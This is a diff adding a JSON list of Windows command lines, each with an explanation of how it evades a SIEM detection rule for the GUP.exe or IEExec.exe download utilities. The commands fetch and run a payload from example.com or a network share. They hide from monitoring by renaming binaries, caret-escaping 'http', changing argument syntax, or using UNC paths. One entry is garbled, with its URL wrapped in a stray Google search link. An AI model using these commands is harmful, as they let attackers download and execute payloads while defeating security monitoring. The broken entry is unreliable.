@@ -1,0 +1,22 @@
+[
+  {
+    "output": "cmd.exe /c copy C:\\Windows\\System32\\cmd.exe C:\\Temp\\notepad++.exe && C:\\Temp\\notepad++.exe /c \"C:\\Program Files\\Notepad++\\updater\\GUP.exe -unzipTo C:\\Temp http://example.com/payload.zip\"",
+    "explanation": "The rule uses a negation filter that explicitly checks if the ParentImage ends with '\\notepad++.exe'. By copying a legitimate shell like cmd.exe to a temporary directory, naming it notepad++.exe, and using it to spawn the GUP utility, the filter condition evaluates to true, causing the SIEM to discard the alert."
+  },
+  {
+    "output": "\"C:\\Program Files\\Notepad++\\updater\\GUP.exe\" -unzipTo=C:\\Temp http://example.com/payload.zip",
+    "explanation": "The 'selection_cli' condition relies on a strict text string match for ' -unzipTo ' with trailing and leading spaces. Substituting the trailing space with an equals sign ('-unzipTo=') to supply the destination argument breaks the static signature matching logic while allowing the parameter to parse successfully."
+  },
+  {
+    "output": "cmd.exe /c \"C:\\Program Files\\Notepad++\\updater\\GUP.exe -unzipTo C:\\Temp h^t^t^p://example.com/payload.zip\"",
+    "explanation": "The Windows command shell interprets the caret symbol (^) as an escape character. When executed inside cmd.exe, the raw process creation logs will capture the literal string 'h^t^t^p', breaking the contiguous 'http' substring match constraint without affecting the network resolution capabilities of the binary."
+  },
+  {
+    "output": "copy C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\IEExec.exe %TEMP%\\not_ieexec.exe && %TEMP%\\not_ieexec.exe [http://example.com/payload.exe](https://www.google.com/search?q=http://example.com/payload.exe)",
+    "explanation": "The rule checks for process creation events where the Image ends with '\\IEExec.exe' or the OriginalFileName is 'IEExec.exe'. If an attacker copies the legitimate IEExec.exe binary to a different location and renames it (e.g., to 'not_ieexec.exe'), the Image field will no longer match the '\\u005CIEExec.exe' condition. Furthermore, depending on how the OS or the logging agent populates the OriginalFileName field for renamed or copied system binaries during execution, changing the file name can sometimes evade basic static string matching on process creation logs."
+  },
+  {
+    "output": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\IEExec.exe \\\\127.0.0.1\\share\\payload.exe",
+    "explanation": "The rule strictly requires the command line to contain either 'http://' or 'https://'. If the target file is hosted on a local or accessible network share via SMB, the command line can use a UNC path instead of a web URL, which fulfills the execution capability of IEExec while failing to trigger the 'selection_cli' criteria."
+  }
+]
